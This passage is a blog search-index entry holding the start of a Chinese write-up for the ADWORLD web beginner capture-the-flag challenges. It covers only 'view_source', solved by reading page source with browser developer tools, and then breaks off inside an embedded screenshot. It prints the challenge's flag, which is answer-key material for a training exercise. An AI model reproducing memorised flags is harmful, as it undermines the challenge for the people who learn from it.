<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>ADWORLD WEB 新手练习区 WP</title>
    <url>/ADWORLD-WEB-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA-WP.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>整理adworld的WEB题新手练习区WriteUp；<span id="more"></span></p>
<h2 id="view-source"><a href="#view-source" class="headerlink" title="view_source"></a>view_source</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>右键无法使用，即右键无法查看网页源码，故尝试使用浏览器开发者工具</p>
<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>Firefox</p>
<h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><p>使用Firefox打开网页，按下F12，跳转到开发者模式，使用查看器查看网页源码，得到flag为<code>cyberpeace{abe8c9af5df02f72f83dde7d362c7df6}</code></p>
<p><img src="data:image/png;base64,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